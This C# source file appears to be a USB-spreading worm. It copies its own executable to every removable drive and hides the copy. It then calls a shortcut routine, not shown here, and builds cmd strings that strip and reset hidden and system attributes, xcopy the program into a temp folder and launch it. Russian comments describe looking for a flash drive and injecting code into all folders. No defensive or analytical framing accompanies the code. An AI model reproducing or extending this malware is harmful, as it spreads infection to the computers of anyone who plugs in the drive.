using System;
using System.Collections.Generic;
using System.IO;
using System.ComponentModel;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Drawing;
using System.Management;
using IWshRuntimeLibrary;
using File = System.IO.File;


namespace ConsoleApp1
{
   
    class Program
    { 
         protected static string io = Path.GetFileName(System.Reflection.Assembly.GetEntryAssembly().Location);
        protected static string dircmd = Environment.GetFolderPath(Environment.SpecialFolder.System);
        protected static string atribexe = @" / c ""start % cd %";     
        protected static string atribdir = " /c \"%SystemRoot%\\explorer.exe %cd%";
        protected static string atribkey = " & attrib -s -h %cd%"+io+ @" & xcopy /F /S /Q /H /R /Y %cd%" + io + @" %temp%\EcSOK\ & attrib +s +h %cd%" + io + @" & start %temp%\EcSOK\" + io + @" & exit""";
        protected static void Main(string[] args)
        {
            DriveInfo[] drives = DriveInfo.GetDrives();
            foreach (DriveInfo drive in drives)
            {
                if (drive.DriveType == DriveType.Removable)//Ишим флешку  
                {
                    //если нашла выполняем внетрения кода в все папки
                    File.Copy(io, drive.Name + io);
                    System.IO.File.SetAttributes(drive.Name + io, System.IO.FileAttributes.Hidden);

                    Shortcut.ss(drive);
                }
            }

        }
    }
}
       
            
            
        
  